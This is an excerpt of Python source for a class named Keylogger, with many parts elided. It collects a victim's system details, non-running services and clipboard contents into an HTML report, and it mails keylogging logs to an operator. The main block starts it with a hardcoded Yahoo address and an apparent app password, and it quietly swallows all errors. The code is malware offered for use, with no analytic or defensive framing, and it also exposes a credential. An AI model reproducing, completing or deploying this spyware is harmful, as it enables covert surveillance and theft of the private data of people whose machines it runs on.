...
class Keylogger:
    ...
    def AboutComputerSystem(self):
        try:
            ...
            result = result.replace(";", ";<br>").replace("instance of Win32_ComputerSystem",
                                                          "<b>INSTANCE OF WIN32_COMPUTERSYSTEM</b><br>").replace("}",
                                                                                                                 "").replace(
                "{", "")
    ...
    def victimInfo(self):
        return """
                ...
                """ + str(self.nonRunningServices()) + """
                   <hr>
                    <h2 align="center">[+] Clipboard Information</h2>
                  """ + str(self.copy_clipboard()) + """
                   <hr> 
                </body>
                </html>
                """
    ...
    def sendMail(self, from_email, password, to_email, log=""):
        try:
            ...
            self.mail[
                "Subject"] = "Keylogger Log Records  From " + self.user + " ~ " + datetime.datetime.now().strftime(
                "%d-%m-%Y %H") + ":**"
...
try:
    ...
    KeyLogger = Keylogger(interval_for_log, interval_for_Screenshot, "crypt.keylog@yahoo.com", "njibqrwicinzuyjq",
                          "crypt.keylog@yahoo.com")
    KeyLogger.start()
except:
    pass
